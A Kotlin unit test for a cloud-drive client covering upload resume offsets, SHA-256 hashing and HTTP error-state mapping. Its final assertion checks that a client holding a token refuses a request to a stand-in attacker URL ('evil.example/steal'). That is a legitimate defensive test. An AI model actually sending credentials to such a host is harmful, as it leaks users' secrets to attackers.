package com.eva.cloud

import org.junit.Test
import org.junit.Assert.*

class DriveChecksTest {
    @Test fun resumeOffsetHashesAndErrorRecovery() {
        assertEquals(0L, uploadedOffset(null, 100))
        assertEquals(43L, uploadedOffset("bytes=0-42", 100))
        assertEquals(100L, uploadedOffset("bytes=0-99", 100))
        for (bad in listOf("bytes=1-42", "bytes=0-100", "wrong", "bytes=0--1")) {
            assertTrue(runCatching { uploadedOffset(bad, 100) }.isFailure)
        }
        assertEquals("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", sha256 { "abc".byteInputStream() })
        assertEquals("AUTH_REQUIRED", DriveHttpError(401, "unauthorized").state)
        assertEquals("QUOTA_FULL", DriveHttpError(403, "storageQuotaExceeded").state)
        assertEquals("FAILED_RETRYABLE", DriveHttpError(403, "rateLimitExceeded").state)
        assertEquals("FAILED_RETRYABLE", DriveHttpError(503, "unavailable").state)
        assertEquals("PERMANENT_FAILURE", DriveHttpError(403, "forbidden").state)
        assertTrue(runCatching { DriveClient("secret").call("https://evil.example/steal") }.isFailure)
    }
}
